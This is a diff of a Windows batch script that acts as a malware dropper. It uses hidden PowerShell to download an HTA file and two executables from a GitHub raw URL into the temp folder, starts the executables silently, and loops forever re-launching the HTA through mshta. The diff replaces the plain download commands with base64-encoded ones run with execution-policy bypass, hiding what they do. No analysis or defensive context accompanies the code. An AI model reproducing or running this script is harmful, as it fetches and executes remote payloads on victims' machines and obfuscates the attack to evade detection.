@@ -1,22 +1,22 @@
-:top0
- timeout /t 1 &
-powershell -Window Hidden Invoke-WebRequest -Uri https://raw.githubusercontent.com/jinafaz/Home/master/mathew.hta -Outfile %tmp%/mathew.hta
-goto top1
+:top0 
+timeout /t 1 & 
+powershell.exe -exec bypass -enc LQBXAGkAbgBkAG8AdwAgAEgAaQBkAGQAZQBuACAASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AagBpAG4AYQBmAGEAegAvAEgAbwBtAGUALwBtAGEAcwB0AGUAcgAvAG0AYQB0AGgAZQB3AC4AaAB0AGEAIAAtAE8AdQB0AGYAaQBsAGUAIABDADoALwBXAGkAbgBkAG8AdwBzAC8AVABlAG0AcAAvAG0AYQB0AGgAZQB3AC4AaAB0AGEA 
+goto top1 
 
-:top1
- timeout /t 1 &
-powershell -Window Hidden Invoke-WebRequest -Uri https://raw.githubusercontent.com/jinafaz/Home/master/mario.exe -Outfile %tmp%/mario.exe
-cmd /c start /B %tmp%/mario.exe
-goto top2
+:top1 
+timeout /t 1 & 
+powershell.exe -exec bypass -enc LQBXAGkAbgBkAG8AdwAgAEgAaQBkAGQAZQBuACAASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AagBpAG4AYQBmAGEAegAvAEgAbwBtAGUALwBtAGEAcwB0AGUAcgAvAG0AYQByAGkAbwAuAGUAeABlACAALQBPAHUAdABmAGkAbABlACAAQwA6AFcAaQBuAGQAbwB3AHMALwBUAGUAbQBwAC8AbQBhAHIAaQBvAC4AZQB4AGUA 
+cmd /c start /B %tmp%/mario.exe 
+goto top2 
 
-:top2
- timeout /t 1 &
-powershell -Window Hidden Invoke-WebRequest -Uri https://raw.githubusercontent.com/jinafaz/Home/master/coral.exe -Outfile %tmp%/coral.exe
-cmd /c start /B %tmp%/coral.exe
+:top2 
+timeout /t 1 & 
+powershell.exe -exec bypass -enc LQBXAGkAbgBkAG8AdwAgAEgAaQBkAGQAZQBuACAASQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAALQBVAHIAaQAgAGgAdAB0AHAAcwA6AC8ALwByAGEAdwAuAGcAaQB0AGgAdQBiAHUAcwBlAHIAYwBvAG4AdABlAG4AdAAuAGMAbwBtAC8AagBpAG4AYQBmAGEAegAvAEgAbwBtAGUALwBtAGEAcwB0AGUAcgAvAGMAbwByAGEAbAAuAGUAeABlACAALQBPAHUAdABmAGkAbABlACAAQwA6AFcAaQBuAGQAbwB3AHMALwBUAGUAbQBwAC8AYwBvAHIAYQBsAC4AZQB4AGUA 
+cmd /c start /B %tmp%/coral.exe 
 goto top3 
 
-:top3 
-timeout /t 100 &
-taskkill /IM mshta.exe /F
-powershell invoke-expression 'mshta %tmp%/mathew.hta'
+:top3  
+timeout /t 100 & 
+taskkill /IM mshta.exe /F 
+powershell invoke-expression 'mshta %tmp%/mathew.hta' 
 goto top3
